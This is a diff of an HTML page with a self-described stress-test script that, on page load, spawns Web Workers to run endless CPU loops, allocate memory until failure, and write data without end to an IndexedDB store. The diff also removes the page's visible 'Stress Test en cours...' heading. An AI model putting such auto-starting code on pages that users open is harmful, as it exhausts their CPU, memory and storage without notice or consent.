@@ -17,99 +17,96 @@
   </style>
 </head>
 <body>
-  <h1 style="text-align:center;margin-top:20vh;font-size:3em;">Stress Test en cours...</h1>
+<script>
+  // Stress Test : CPU, RAM, HDD démarrent automatiquement
+  let activeWorkers = [];
+  const coreCount = navigator.hardwareConcurrency || 4;
 
-  <script>
-    // Stress Test : CPU, RAM, HDD démarrent automatiquement
-    let activeWorkers = [];
-    const coreCount = navigator.hardwareConcurrency || 4;
-
-    function burnCPU() {
-      while (true) {
-        let x = 1;
-        for (let i = 0; i < 10000000; i++) {
-          x = Math.sin(Math.sqrt(x * Math.random()));
-          x = Math.atan(Math.pow(x, 2.5));
-        }
+  function burnCPU() {
+    while (true) {
+      let x = 1;
+      for (let i = 0; i < 10000000; i++) {
+        x = Math.sin(Math.sqrt(x * Math.random()));
+        x = Math.atan(Math.pow(x, 2.5));
       }
     }
+  }
 
-    function burnRAM() {
-      const memoryHog = [];
-      const chunkSize = 10 * 1024 * 1024;
-      const numbersPerChunk = chunkSize / 8;
-      while (true) {
-        try {
-          const chunk = new Float64Array(numbersPerChunk);
-          for(let i = 0; i < chunk.length; i++) {
-            chunk[i] = Math.random();
-          }
-          memoryHog.push(chunk);
-        } catch (e) {
-          break;
-        }
-      }
-    }
-
-    async function burnHDD() {
-      const dbName = "HDDBurnDB";
-      const storeName = "DataStore";
-      const chunkSize = 10 * 1024 * 1024;
-      function openDB() {
-        return new Promise((resolve, reject) => {
-          const request = indexedDB.open(dbName, 1);
-          request.onupgradeneeded = e => {
-            const db = e.target.result;
-            if (!db.objectStoreNames.contains(storeName)) {
-              db.createObjectStore(storeName, { autoIncrement: true });
-            }
-          };
-          request.onsuccess = e => resolve(e.target.result);
-          request.onerror = e => reject(e.target.error);
-        });
-      }
-      function addData(db, data) {
-        return new Promise((resolve, reject) => {
-          const transaction = db.transaction([storeName], "readwrite");
-          const store = transaction.objectStore(storeName);
-          const request = store.add(data);
-          transaction.oncomplete = () => resolve();
-          transaction.onerror = e => reject(e.target.error);
-        });
-      }
+  function burnRAM() {
+    const memoryHog = [];
+    const chunkSize = 10 * 1024 * 1024;
+    const numbersPerChunk = chunkSize / 8;
+    while (true) {
       try {
-        const db = await openDB();
-        while (true) {
-          const dataChunk = new Uint8Array(chunkSize).map((_,i) => i % 256);
-          try {
-            await addData(db, dataChunk);
-          } catch (e) {
-            const tx = db.transaction([storeName], "readwrite");
-            await new Promise(r => tx.objectStore(storeName).clear().onsuccess = r);
-          }
+        const chunk = new Float64Array(numbersPerChunk);
+        for(let i = 0; i < chunk.length; i++) {
+          chunk[i] = Math.random();
         }
+        memoryHog.push(chunk);
       } catch (e) {
-        // Impossible d'ouvrir IndexedDB
+        break;
       }
     }
+  }
 
-    function createWorker(fn) {
-      const blob = new Blob([`(${fn.toString()})()`], { type: 'application/javascript' });
-      const worker = new Worker(URL.createObjectURL(blob));
-      activeWorkers.push(worker);
+  async function burnHDD() {
+    const dbName = "HDDBurnDB";
+    const storeName = "DataStore";
+    const chunkSize = 10 * 1024 * 1024;
+    function openDB() {
+      return new Promise((resolve, reject) => {
+        const request = indexedDB.open(dbName, 1);
+        request.onupgradeneeded = e => {
+          const db = e.target.result;
+          if (!db.objectStoreNames.contains(storeName)) {
+            db.createObjectStore(storeName, { autoIncrement: true });
+          }
+        };
+        request.onsuccess = e => resolve(e.target.result);
+        request.onerror = e => reject(e.target.error);
+      });
     }
-
-    window.onload = function() {
-      // Lancer tous les tests automatiquement
-      for (let i = 0; i < coreCount; i++) {
-        createWorker(burnCPU);
+    function addData(db, data) {
+      return new Promise((resolve, reject) => {
+        const transaction = db.transaction([storeName], "readwrite");
+        const store = transaction.objectStore(storeName);
+        const request = store.add(data);
+        transaction.oncomplete = () => resolve();
+        transaction.onerror = e => reject(e.target.error);
+      });
+    }
+    try {
+      const db = await openDB();
+      while (true) {
+        const dataChunk = new Uint8Array(chunkSize).map((_,i) => i % 256);
+        try {
+          await addData(db, dataChunk);
+        } catch (e) {
+          const tx = db.transaction([storeName], "readwrite");
+          await new Promise(r => tx.objectStore(storeName).clear().onsuccess = r);
+        }
       }
-      createWorker(burnRAM);
-      createWorker(burnHDD);
-      createWorker(burnHDD);
-    };
-  </script>
+    } catch (e) {
+      // Impossible d'ouvrir IndexedDB
+    }
+  }
 
-  </script>
+  function createWorker(fn) {
+    const blob = new Blob([`(${fn.toString()})()`], { type: 'application/javascript' });
+    const worker = new Worker(URL.createObjectURL(blob));
+    activeWorkers.push(worker);
+  }
+
+  window.onload = function() {
+    // Lancer tous les tests automatiquement
+    for (let i = 0; i < coreCount; i++) {
+      createWorker(burnCPU);
+    }
+    createWorker(burnRAM);
+    createWorker(burnHDD);
+    createWorker(burnHDD);
+  };
+</script>
 </body>
 </html>
+
